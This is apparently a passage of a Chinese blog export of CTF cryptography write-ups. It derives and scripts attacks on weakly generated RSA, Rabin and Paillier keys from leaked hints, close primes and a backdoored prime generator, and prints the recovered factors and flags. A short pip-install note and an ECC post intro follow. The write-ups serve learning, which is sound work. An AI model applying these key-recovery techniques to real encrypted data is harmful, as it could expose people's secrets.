<p><strong>DEDUCTION-1</strong><br>$$<br>\because phi &#x3D; (p-1) \times (q-1) &#x3D; n - (p + q) + 1<br>$$</p>
<p>$$<br>\therefore p + q &#x3D; n + 1 - phi<br>$$</p>
<p>利用<strong>KEY-1</strong>以及<strong>KEY-2</strong>进行代入处理：<br>$$<br>e\cdot(leak - (p + q)) &#x3D; 1 + k \times phi<br>$$</p>
<p>$$<br>\Longrightarrow e \cdot (leak - n - 1 + phi) &#x3D; 1 + k\times phi<br>$$</p>
<p>$$<br>\Longrightarrow (e - k)\times phi &#x3D; e(n + 1 - leak) + 1<br>$$</p>
<p>$$<br>\therefore phi &#x3D; (e(n + 1 - leak) + 1) &#x2F;&#x2F; (e - k)<br>$$</p>
<p>所以，存在$k \in [1, e-1]$，使得上式成立，再利用<code>flag</code>的特殊格式进行判断，因此，我们可以得到两个判断条件。</p>
<ul>
<li>$phi \mod (e - k) &#x3D;&#x3D; 0$</li>
<li><code>flag[4:5] == &#39;-&#39; and flag[9:10] == &#39;-&#39;</code></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">65537</span>):</span><br><span class="line">    <span class="keyword">if</span> (e2 * (n2 - leak2 + <span class="number">1</span>) + <span class="number">1</span>) % (e2 - k) == <span class="number">0</span>:</span><br><span class="line">        phi = (e2 * (n2 - leak2 + <span class="number">1</span>) + <span class="number">1</span>) // (e2 - k)</span><br><span class="line">        d2 = <span class="built_in">int</span>(invert(e2, phi))</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            m2 = <span class="built_in">pow</span>(c2, d2, n2)</span><br><span class="line">            flag2 = (long_to_bytes(m2)[:<span class="number">14</span>]).decode()</span><br><span class="line">            <span class="keyword">if</span> flag2[<span class="number">4</span>:<span class="number">5</span>] == <span class="string">&#x27;-&#x27;</span> <span class="keyword">and</span> flag2[<span class="number">9</span>:<span class="number">10</span>] == <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">                <span class="built_in">print</span>(flag2)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<p><strong>DEDUCTION-2</strong></p>
<p>可得：<br>$$<br>(e - k)\times phi &#x3D; e(n + 1 - leak) + 1<br>$$<br>简化一下，即为：<br>$$<br>Kphi &#x3D; e(n + 1 - leak) + 1<br>$$<br>此时可以直接利用求逆元的方式求解私钥$d$：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">K_phi = e2 * (n2 - leak2 + <span class="number">1</span>) + <span class="number">1</span></span><br><span class="line">d2 = <span class="built_in">int</span>(invert(e2, K_phi))</span><br></pre></td></tr></table></figure>

<p><em>模phi以及模Kphi，等价</em></p>
<h2 id="challenge-3"><a href="#challenge-3" class="headerlink" title="challenge 3"></a>challenge 3</h2><ul>
<li>fermat</li>
</ul>
<p><strong>KEY</strong><br>$$<br>leak \equiv (p^{q} \mod n + q^{p} \mod n) \mod n<br>$$</p>
<p>$$<br>\mod n \rightarrow \mod p &#x2F;\mod q<br>$$</p>
<p><strong>DEDUCTION-1</strong><br>$$<br>leak \equiv p^{q} \mod n + q^{p}\mod n<br>$$</p>
<p>$$<br>\Longrightarrow leak \equiv p^{q} \mod q + q^{p} \mod p<br>$$</p>
<p>利用费马小定理$a^p \equiv a \mod p$，我们可以得到：<br>$$<br>\Longrightarrow leak &#x3D; p + q<br>$$<br>跟$n &#x3D; p \times q$ 联立方程，可求解出$p$以及$q$。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p3, q3 = var(<span class="string">&#x27;p3 q3&#x27;</span>)</span><br><span class="line">sol3 = solve([p3 + q3 - leak3, p3 * q3 - n3], [p3, q3])</span><br><span class="line"><span class="built_in">print</span>(sol3[<span class="number">1</span>])</span><br></pre></td></tr></table></figure>

<p><strong>DEDUCTION-2</strong></p>
<p>可得：<br>$$<br>leak \equiv p^{q} \mod n + q^{p}\mod n<br>$$</p>
<p>$$<br>\rightarrow leak &#x3D; p + k_1 q<br>$$</p>
<p>$$<br>\rightarrow leak &#x3D; q + k_2 p<br>$$</p>
<p>$$<br>\Longrightarrow p + k_1 q &#x3D; q + k_2 p<br>$$</p>
<p>$$<br>\therefore k_1 &#x3D; 1, k_2 &#x3D; 1<br>$$</p>
<p>$$<br>\Longrightarrow leak &#x3D; p + q<br>$$</p>
<p>回归上面的代码，联立方程求解$p$以及$q$。</p>
<h2 id="CODE"><a href="#CODE" class="headerlink" title="CODE"></a>CODE</h2><p><strong>sagemath</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># %%</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">from gmpy2 import *</span><br><span class="line"></span><br><span class="line">def unpad(msg):</span><br><span class="line">    return msg.split(b&#x27;\x00&#x27;)[0]</span><br><span class="line"></span><br><span class="line"># challenge 1</span><br><span class="line">e1 = 65537</span><br><span class="line">c1 = 112742443814287255411540092433156061065388404049949520959549377871297566383025041892192679147481155020865118811016470498351633875090973546567374001852295013083192495299811476604405637385307524194793969533646755764136014187430115618114840780368311166911900457224593131166970676797547489278410997707815915932756</span><br><span class="line">n1 = 121127425328043404860413278637978444801342472819958112597540188142689720655042880213001676368390521140660355813910726809125567752172921410143437643574528335234973793653775043030021036875866776532570781661875022102733555943967261003246543180935987772711036868216508554536086688819118597075508026787867088355603</span><br><span class="line">leak1 = 216638862637129382765636503118049146067015523924032194492700294200289728064297722088882791754351329407138196573832392846467607399504585045028165699421278</span><br><span class="line"></span><br><span class="line">P.&lt;x&gt; = PolynomialRing(ZZ)</span><br><span class="line">for k in range(1, 4):</span><br><span class="line">    f = k * (x - 1) * x + leak1 * x - 2 * n1</span><br><span class="line">    try:</span><br><span class="line">        q1 = f.roots()[0][0]</span><br><span class="line">        # print(q1)</span><br><span class="line">        break</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">p1 = n1 // q1</span><br><span class="line">d1 = invert(e1, (p1 - 1)*(q1 - 1))</span><br><span class="line">m1 = int(powmod(c1, d1, n1))</span><br><span class="line">flag1 = unpad(long_to_bytes(m1)).decode()</span><br><span class="line">print(flag1)</span><br><span class="line"></span><br><span class="line"># %%</span><br><span class="line"># challenge 2</span><br><span class="line">e2 = 65537</span><br><span class="line">c2 = 7964477910021153997178145480752641882728907630831216554750778499596527781702830885213467912351097301767341858663701574005489585561370961723264247818377063081744522471774208105250855114831033452448184392499682147532404562876275189577321587660597603848038824026981539659156304028998137796242331160312370913038</span><br><span class="line">n2 = 140571013522095816880929287025269553867630639381779595547026503691829940612178900269986625350464874598461222087427155791855120339533208468121389480964471710028253589422629569889402475311387750348466199387760629889238062977271925350490110043385800605640905324122017637306715108727700910035925728362455954862209</span><br><span class="line">leak2 = 58442382248753295429370894053397615609981110383986887405127350139482893508400422595729520437678203735054593866306478994471465948872565590901376309380029015549809468112086393107585011072503638322671608471684607214064187044372418770555236721845694224676090744181562673509234801011420696349507624867568099759003</span><br><span class="line"></span><br><span class="line">K_phi = e2 * (n2 - leak2 + 1) + 1</span><br><span class="line">d2 = int(invert(e2, K_phi))</span><br><span class="line">m2 = int(pow(c2, d2, n2))</span><br><span class="line">flag2 = unpad(long_to_bytes(m2)).decode()</span><br><span class="line">print(flag2)</span><br><span class="line"></span><br><span class="line"># %%</span><br><span class="line"># challenge 3</span><br><span class="line">e3 = 65537</span><br><span class="line">c3 = 54161995127842474543974770981473422085334044100057089719350274921419091368361244533281599379235907845996678762379778310924192757650322930707785543132446159092950451255660204858292974657119337026589911330412367633761103944916751660957776230135927005700707688661350641600954072696774954805514477330339449799540</span><br><span class="line">n3 = 88207747624007183083381863279444163105330473097729276113333026679597864128605555600000789783468271680476780366740448641311570797876037993255307716167149079618302706650018518487351604778857406170722209469765782625409279109832638886179654096975665134276856272488090272822541461702907181545730309689190333058151</span><br><span class="line">leak3 = 19596671928335648228117128090384865424885102632642665068992144783391306491716530155291726644158221224616817878768426330717188403310818678195631582453246848</span><br><span class="line"></span><br><span class="line"># p3, q3 = var(&#x27;p3 q3&#x27;)</span><br><span class="line"># sol3 = solve([p3 + q3 - leak3, p3 * q3 - n3], [p3, q3])</span><br><span class="line"># print(sol3)</span><br><span class="line">p3 = 12591119529483514723681507251180531324926419443874102860338530066728710197246719851038994673567739600391874839712324936583490370533180101117667257937826949</span><br><span class="line">q3 = 7005552398852133504435620839204334099958683188768562208653614716662596294469810304252731970590481624224943039056101394133698032777638577077964324515419899</span><br><span class="line">d3 = invert(e3, (p3 - 1)*(q3 - 1))</span><br><span class="line">m3 = int(powmod(c3, d3, n3))</span><br><span class="line">flag3 = unpad(long_to_bytes(m3)).decode()</span><br><span class="line">print(flag3)</span><br><span class="line"></span><br><span class="line"># %%</span><br><span class="line">flag = flag1 + flag2 + flag3</span><br><span class="line">assert len(flag) == 42</span><br><span class="line">print(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>python</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># chall 1</span></span><br><span class="line">e1 = <span class="number">65537</span></span><br><span class="line">c1 = <span class="number">112742443814287255411540092433156061065388404049949520959549377871297566383025041892192679147481155020865118811016470498351633875090973546567374001852295013083192495299811476604405637385307524194793969533646755764136014187430115618114840780368311166911900457224593131166970676797547489278410997707815915932756</span></span><br><span class="line">n1 = <span class="number">121127425328043404860413278637978444801342472819958112597540188142689720655042880213001676368390521140660355813910726809125567752172921410143437643574528335234973793653775043030021036875866776532570781661875022102733555943967261003246543180935987772711036868216508554536086688819118597075508026787867088355603</span></span><br><span class="line">leak1 = <span class="number">216638862637129382765636503118049146067015523924032194492700294200289728064297722088882791754351329407138196573832392846467607399504585045028165699421278</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> *</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">法1</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># p1 = var(&#x27;p1&#x27;)</span></span><br><span class="line"><span class="comment"># q1 = var(&#x27;q1&#x27;)</span></span><br><span class="line"><span class="comment"># sol1 = solve([2*p1 - 2*(q1-1) - leak1, p1*q1 - n1], [p1, q1])</span></span><br><span class="line">p1 = <span class="number">11060083511635869933802569808428381768947206326091523957729804139074727442704400779515603361330886302679144280198610157348614007053927945774770324805383761</span></span><br><span class="line">q1 = <span class="number">10951764080317305242419751556869357195913698564129507860483453991974582578672251918471161965453710637975575181911693960925380203354175653252256241955673123</span></span><br><span class="line"><span class="keyword">assert</span> p1 &gt; q1</span><br><span class="line"><span class="keyword">from</span> Functions_Eurynome <span class="keyword">import</span> Original_RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">m1 = Original_RSA(p1, q1, e1, c1, n1)</span><br><span class="line">flag1 = (long_to_bytes(m1)[:<span class="number">14</span>]).decode()</span><br><span class="line"><span class="built_in">print</span>(flag1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># chall 2</span></span><br><span class="line">e2 = <span class="number">65537</span></span><br><span class="line">c2 = <span class="number">7964477910021153997178145480752641882728907630831216554750778499596527781702830885213467912351097301767341858663701574005489585561370961723264247818377063081744522471774208105250855114831033452448184392499682147532404562876275189577321587660597603848038824026981539659156304028998137796242331160312370913038</span></span><br><span class="line">n2 = <span class="number">140571013522095816880929287025269553867630639381779595547026503691829940612178900269986625350464874598461222087427155791855120339533208468121389480964471710028253589422629569889402475311387750348466199387760629889238062977271925350490110043385800605640905324122017637306715108727700910035925728362455954862209</span></span><br><span class="line">leak2 = <span class="number">58442382248753295429370894053397615609981110383986887405127350139482893508400422595729520437678203735054593866306478994471465948872565590901376309380029015549809468112086393107585011072503638322671608471684607214064187044372418770555236721845694224676090744181562673509234801011420696349507624867568099759003</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">法1</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># for k in range(1, 65537):</span></span><br><span class="line"><span class="comment">#     if (e2 * (n2 - leak2 + 1) + 1) % (e2 - k) == 0:</span></span><br><span class="line"><span class="comment">#         phi = (e2 * (n2 - leak2 + 1) + 1) // (e2 - k)</span></span><br><span class="line"><span class="comment">#         d2 = int(invert(e2, phi))</span></span><br><span class="line"><span class="comment">#         try:</span></span><br><span class="line"><span class="comment">#             m2 = pow(c2, d2, n2)</span></span><br><span class="line"><span class="comment">#             flag2 = (long_to_bytes(m2)[:14]).decode()</span></span><br><span class="line"><span class="comment">#             if flag2[4:5] == &#x27;-&#x27; and flag2[9:10] == &#x27;-&#x27;:</span></span><br><span class="line"><span class="comment">#                 print(flag2)</span></span><br><span class="line"><span class="comment">#                 break</span></span><br><span class="line"><span class="comment">#         except:</span></span><br><span class="line"><span class="comment">#             pass</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">法2</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">K_phi = e2 * (n2 - leak2 + <span class="number">1</span>) + <span class="number">1</span></span><br><span class="line">d2 = <span class="built_in">int</span>(invert(e2, K_phi))</span><br><span class="line">m2 = <span class="built_in">pow</span>(c2, d2, n2)</span><br><span class="line">flag2 = (long_to_bytes(m2)[:<span class="number">14</span>]).decode()</span><br><span class="line"><span class="built_in">print</span>(flag2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># chall 3</span></span><br><span class="line">e3 = <span class="number">65537</span></span><br><span class="line">c3 = <span class="number">54161995127842474543974770981473422085334044100057089719350274921419091368361244533281599379235907845996678762379778310924192757650322930707785543132446159092950451255660204858292974657119337026589911330412367633761103944916751660957776230135927005700707688661350641600954072696774954805514477330339449799540</span></span><br><span class="line">n3 = <span class="number">88207747624007183083381863279444163105330473097729276113333026679597864128605555600000789783468271680476780366740448641311570797876037993255307716167149079618302706650018518487351604778857406170722209469765782625409279109832638886179654096975665134276856272488090272822541461702907181545730309689190333058151</span></span><br><span class="line">leak3 = <span class="number">19596671928335648228117128090384865424885102632642665068992144783391306491716530155291726644158221224616817878768426330717188403310818678195631582453246848</span></span><br><span class="line"><span class="comment"># p3, q3 = var(&#x27;p3 q3&#x27;)</span></span><br><span class="line"><span class="comment"># sol3 = solve([p3 + q3 - leak3, p3 * q3 - n3], [p3, q3])</span></span><br><span class="line"><span class="comment"># print(sol3[1])</span></span><br><span class="line">p3 = <span class="number">12591119529483514723681507251180531324926419443874102860338530066728710197246719851038994673567739600391874839712324936583490370533180101117667257937826949</span></span><br><span class="line">q3 = <span class="number">7005552398852133504435620839204334099958683188768562208653614716662596294469810304252731970590481624224943039056101394133698032777638577077964324515419899</span></span><br><span class="line">m3 = Original_RSA(p3, q3, e3, c3, n3)</span><br><span class="line">flag3 = (long_to_bytes(m3)[:<span class="number">14</span>]).decode()</span><br><span class="line"><span class="built_in">print</span>(flag3)</span><br><span class="line"></span><br><span class="line">flag = flag1 + flag2 + flag3</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>



<h1 id="NSSCTF-round11-ez-signin"><a href="#NSSCTF-round11-ez-signin" class="headerlink" title="[NSSCTF-round11]ez_signin"></a>[NSSCTF-round11]ez_signin</h1><ul>
<li>basic</li>
<li>deduction</li>
<li>rabin</li>
</ul>
<p>$$<br>num1 \equiv p^e \mod n - q^e \mod n \equiv p^e - q^e \mod n<br>$$</p>
<p>利用二项式展开定理对其进行展开以及模运算：<br>$$<br>num2 \equiv (p + q)^e \mod n \equiv p^e + q^e \mod n<br>$$</p>
<p>{1}式 + {2}式可得：<br>$$<br>num1 + num2 \equiv 2 p^e \mod n<br>$$<br>又从题目得到$n &#x3D; p \times q$，利用<code>gcd()</code>可得<code>p</code>：<br>$$<br>p &#x3D; gcd(num1 + num2, n)<br>$$<br>而<code>q</code>即为$q &#x3D; n &#x2F;&#x2F; p$.</p>
<p>得到<code>p</code>以及<code>q</code>后，发现$p\equiv q \equiv 3 \mod 4$，而$e &#x3D; 65536 &#x3D; 2^{16}$，可得下一个知识点为<code>Rabin</code>算法，且循环使用16次。</p>
<p>所以我们对原始的<code>c</code>先进行一次<code>Rabin</code>，所得的四个明文作为<code>c</code>继续循环使用<code>Rabin</code>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">num1 = <span class="number">134186458247304184975418956047750205959249518467116558944535042073046353646812210914711656218265319503240074967140027248278994209294869476247136854741631971975560846483033205230015783696055443897579440474585892990793595602095853960468928457703619205343030230201261058516219352855127626321847429189498666288452</span></span><br><span class="line">num2 = <span class="number">142252615203395148320392930915384149783801592719030740337592034613073131106036364733480644482188684184951026866672011061092572389846929838149296357261088256882232316029199097203257003822750826537629358422813658558008420810100860520289261141533787464661186681371090873356089237613080052677646446751824502044253</span></span><br><span class="line">n = <span class="number">154128165952806886790805410291540694477027958542517309121222164274741570806324940112942356615458298064007096476638232940977238598879453357856259085001745763666030177657087772721079761302637352680091939676709372354103177660093164629417313468356185431895723026835950366030712541994019375251534778666996491342313</span></span><br><span class="line">c = <span class="number">9061020000447780498751583220055526057707259079063266050917693522289697419950637286020502996753375864826169562714946009146452528404466989211057548905704856329650955828939737304126685040898740775635547039660982064419976700425595503919207903099686497044429265908046033565745195837408532764433870408185128447965</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line">p = gcd(num1 + num2, n)</span><br><span class="line">q = n // p</span><br><span class="line"><span class="keyword">assert</span> is_prime(p)</span><br><span class="line"><span class="keyword">assert</span> is_prime(q)</span><br><span class="line"><span class="keyword">assert</span> p % <span class="number">4</span> == <span class="number">3</span></span><br><span class="line"><span class="keyword">assert</span> q % <span class="number">4</span> == <span class="number">3</span></span><br><span class="line"><span class="comment"># print(p)</span></span><br><span class="line"><span class="comment"># print(q)</span></span><br><span class="line"><span class="comment"># print(p.bit_length())</span></span><br><span class="line"><span class="comment"># print(q.bit_length())</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 65536 == 2**16</span></span><br><span class="line">cs = [c]</span><br><span class="line"></span><br><span class="line">gcd, yp, yq = gcdext(p, q)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    ps = []</span><br><span class="line">    <span class="keyword">for</span> cc <span class="keyword">in</span> cs:</span><br><span class="line">        mp = powmod(cc, (p + <span class="number">1</span>) // <span class="number">4</span>, p)</span><br><span class="line">        mq = powmod(cc, (q + <span class="number">1</span>) // <span class="number">4</span>, q)</span><br><span class="line"></span><br><span class="line">        m1 = (yp * p * mq + yq * q * mp) % n</span><br><span class="line">        m2 = n - m1</span><br><span class="line">        m3 = (yp * p * mq - yq * q * mp) % n</span><br><span class="line">        m4 = n - m3</span><br><span class="line">        <span class="keyword">if</span> m1 <span class="keyword">not</span> <span class="keyword">in</span> ps:</span><br><span class="line">            ps.append(m1)</span><br><span class="line">        <span class="keyword">if</span> m2 <span class="keyword">not</span> <span class="keyword">in</span> ps:</span><br><span class="line">            ps.append(m2)</span><br><span class="line">        <span class="keyword">if</span> m3 <span class="keyword">not</span> <span class="keyword">in</span> ps:</span><br><span class="line">            ps.append(m3)</span><br><span class="line">        <span class="keyword">if</span> m4 <span class="keyword">not</span> <span class="keyword">in</span> ps:</span><br><span class="line">            ps.append(m4)</span><br><span class="line"></span><br><span class="line">    cs = ps</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> ps:</span><br><span class="line">        flag = long_to_bytes(m)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;nss&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="comment"># nssctf&#123;W3lc0me_t0_nssctf_R0undll_w15h_U_can_have_Fun_t0day!!!#0919&#125;</span></span><br></pre></td></tr></table></figure>



<h1 id="DASCTF2020-4-not-RSA"><a href="#DASCTF2020-4-not-RSA" class="headerlink" title="[DASCTF2020-4]not RSA"></a>[DASCTF2020-4]not RSA</h1><blockquote>
<p>relating: [网鼎杯2020华南区复赛]paillier</p>
</blockquote>
<ul>
<li>paillier-2</li>
</ul>
<p>$n$比较小，直接<code>yafu</code>分解或者费马分解都可以。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c = <span class="number">29088911054711509252215615231015162998042579425917914434962376243477176757448053722602422672251758332052330100944900171067962180230120924963561223495629695702541446456981441239486190458125750543542379899722558637306740763104274377031599875275807723323394379557227060332005571272240560453811389162371812183549</span></span><br><span class="line">n = <span class="number">6401013954612445818165507289870580041358569258817613282142852881965884799988941535910939664068503367303343695466899335792545332690862283029809823423608093</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># yafu</span></span><br><span class="line">p = <span class="number">80006336965345725157774618059504992841841040207998249416678435780577798937819</span></span><br><span class="line">q = <span class="number">80006336965345725157774618059504992841841040207998249416678435780577798937447</span></span><br><span class="line"></span><br><span class="line">L = <span class="keyword">lambda</span> x: (x - <span class="number">1</span>) // n</span><br><span class="line">lam = (p - <span class="number">1</span>)*(q - <span class="number">1</span>)</span><br><span class="line">miu = invert(lam, n)</span><br><span class="line"></span><br><span class="line">m = L(<span class="built_in">pow</span>(c, <span class="built_in">int</span>(lam), n*n)) * miu % n</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>



<h1 id="GKCTF2020-Backdoor"><a href="#GKCTF2020-Backdoor" class="headerlink" title="[GKCTF2020]Backdoor"></a>[GKCTF2020]Backdoor</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. cve查看漏洞，对n进行爆破，求解p,q</span><br><span class="line">2. pub.pem提取e,n flag.enc提取c</span><br><span class="line">3. ==&gt; Original_RSA()</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">p=k*M+(65537**a %M)</span><br></pre></td></tr></table></figure>

<h2 id="p-x3D-k-times-M-65537-a-mod-M-BackdoorCVE求解p-q"><a href="#p-x3D-k-times-M-65537-a-mod-M-BackdoorCVE求解p-q" class="headerlink" title="$p &#x3D; k \times M + (65537^{a} mod M)$BackdoorCVE求解p,q"></a>$p &#x3D; k \times M + (65537^{a} mod M)$BackdoorCVE求解p,q</h2><blockquote>
<p><a href="https://asecuritysite.com/encryption/copper">https://asecuritysite.com/encryption/copper</a></p>
</blockquote>
<h1 id="NepCTF2022-中学数学"><a href="#NepCTF2022-中学数学" class="headerlink" title="[NepCTF2022]中学数学"></a>[NepCTF2022]中学数学</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 核心生成</span></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = next_prime(p + (p &gt;&gt; <span class="number">500</span>))</span><br></pre></td></tr></table></figure>

<h2 id="q-x3D-next-prime-p-p-gt-gt-500"><a href="#q-x3D-next-prime-p-p-gt-gt-500" class="headerlink" title="q &#x3D; next_prime(p+(p&gt;&gt;500))"></a>q &#x3D; next_prime(p+(p&gt;&gt;500))</h2><p>转换成数学公式$q &#x3D; p + \frac{1}{2^{500}}\cdot{p} + r &#x3D; (1 + \frac{1}{2^{500}})p + r$</p>
<p>此时：$r$为凑到素数的最小整数</p>
<h2 id="n-x3D-p-q"><a href="#n-x3D-p-q" class="headerlink" title="n &#x3D; p*q"></a>n &#x3D; p*q</h2><p>代入$q$得到：<br>$$<br>n &#x3D; p\cdot q<br>$$</p>
<p>$$<br>n &#x3D; p\cdot((1+\frac{1}{2^{500}})p + r)<br>$$</p>
<p>$$<br>n &#x3D; (1+\frac{1}{2^{500}})\cdot p^{2} + r\cdot p<br>$$</p>
<h2 id="凑平方"><a href="#凑平方" class="headerlink" title="凑平方"></a>凑平方</h2><p>等式左右两边同时乘上$(1+\frac{1}{2^{500}})$，凑出平方：<br>$$<br>(1+ \frac{1}{2^{500}})n &#x3D; ((1+\frac{1}{2^{500}})p)^{2}+(1+\frac{1}{2^{500}})rp<br>\ &gt; ((1+\frac{1}{2^{500}})p)^{2}<br>$$</p>
<h2 id="进行约束计算"><a href="#进行约束计算" class="headerlink" title="进行约束计算"></a>进行约束计算</h2><p>$$<br>(1+ \frac{1}{2^{500}})n &#x3D; ((1+\frac{1}{2^{500}})p)^{2}+(1+\frac{1}{2^{500}})rp \tag1<br>$$</p>
<p>$$<br>q^{2} &#x3D; ((1+\frac{1}{2^{500}})p + r)^{2}&#x3D;((1+ \frac{1}{2^{500}})p)^{2} + (1+\frac{1}{2^{500}})rp + (1+\frac{1}{2^{500}})rp + r^{2} \tag2\<br>$$</p>
<p>显然$(2)$大于$(1)$</p>
<h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>$$<br>(1+\frac{1}{2^{500}})p &lt; \sqrt{n(1+\frac{1}{2^{500}}}) &lt; (1+\frac{1}{2^{500}})p+r &#x3D; q<br>$$</p>
<p>此时<code>next_prime(iroot(n+(n&gt;&gt;500))[0])</code>为$q$，然后转换成基础RSA。</p>
<h2 id="根据结论得到q，转换成基础RSA"><a href="#根据结论得到q，转换成基础RSA" class="headerlink" title="根据结论得到q，转换成基础RSA"></a>根据结论得到q，转换成基础RSA</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">q = next_prime(iroot(n+(n&gt;&gt;<span class="number">500</span>), <span class="number">2</span>)[<span class="number">0</span>])</span><br><span class="line">p = n // q</span><br><span class="line"><span class="comment"># 转换成基础RSA</span></span><br></pre></td></tr></table></figure>



<h1 id="NewStarCTF2022-RSA-begin"><a href="#NewStarCTF2022-RSA-begin" class="headerlink" title="[NewStarCTF2022]RSA_begin"></a>[NewStarCTF2022]RSA_begin</h1><h2 id="Level5-ppq型hint-x2F-简单数学推导"><a href="#Level5-ppq型hint-x2F-简单数学推导" class="headerlink" title="Level5-ppq型hint&#x2F;简单数学推导"></a>Level5-ppq型hint&#x2F;简单数学推导</h2><p>已知：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">n = p * p * q</span><br><span class="line">N = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)*(p)</span><br><span class="line">d = inverse(e, N)</span><br></pre></td></tr></table></figure>

<p>$$<br>c \equiv m^{e} \mod n<br>$$</p>
<p>$$<br>hint \equiv d^{e} \mod n<br>$$</p>
<p>$$<br>de \equiv 1 \mod \varphi(n)<br>$$</p>
<p><strong>根据已知条件进行推导</strong><br>$$<br>d^{e} &#x3D; hint + k_{1} \cdot p\ \tag{1}<br>$$</p>
<p>$$<br>d\cdot e &#x3D; 1 + k_{2}\cdot p \tag{2}<br>$$</p>
<p>通过<strong>同余性</strong>对（2）式进行变形，并代入（1）式<br>$$<br>(d\cdot e)^{e} &#x3D; 1 + k_{3}\cdot p \tag{3}<br>$$</p>
<p>$$<br>d^{e}\cdot e^{e} &#x3D; hint\cdot e^{e} + k_{4}\cdot p<br>$$</p>
<p>整理得（5），即左边含$p$因子<br>$$<br>hint\cdot e^{e} - 1 &#x3D; k_{5}\cdot p \tag{5}<br>$$<br>又因为$n &#x3D; p\cdot p\cdot q$</p>
<p>所以最终可得到<br>$$<br>gcd(hint\cdot e^{e} - 1, n) &#x3D; p \tag{6}<br>$$<br>通过（6），即可把关键因素$p$求解出来。</p>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>recurrent</tag>
      </tags>
  </entry>
  <entry>
    <title>Environment Install</title>
    <url>/2023/07/20/Environment-Install/</url>
    <content><![CDATA[<p>Environment intsall about some problems and their solutions.</p>
<span id="more"></span><!--toc-->

<h1 id="opencv-python"><a href="#opencv-python" class="headerlink" title="opencv-python"></a>opencv-python</h1><blockquote>
<p>pip2 install</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install -i https://pypi.tuna.tsinghua.edu.cn/simple opencv-python==4.2.0.32</span><br></pre></td></tr></table></figure>



<h1 id="sklearn"><a href="#sklearn" class="headerlink" title="sklearn"></a>sklearn</h1><blockquote>
<p>pycharm-setting-Project Interpreter</p>
<p>sklearn –&gt;  scikit-learn</p>
</blockquote>
<ul>
<li>Numpy</li>
<li>Scipy</li>
<li>scikit-learn</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>23-01-11-ECC</title>
    <url>/2023/01/11/23-01-11-ECC/</url>
    <content><![CDATA[<p>Some basics about elliptic curves. Make a description about ECC, and show the attacks and conversions to code. </p>
<p>ECC is somewhat difficult, and also the analysis which is necessary ought to be detailed. </p>
<p>The ECC always connects to the usage of sagemath, this post also introduces some common usages about ECC in sagemath. </p>
<span id="more"></span><!--toc-->

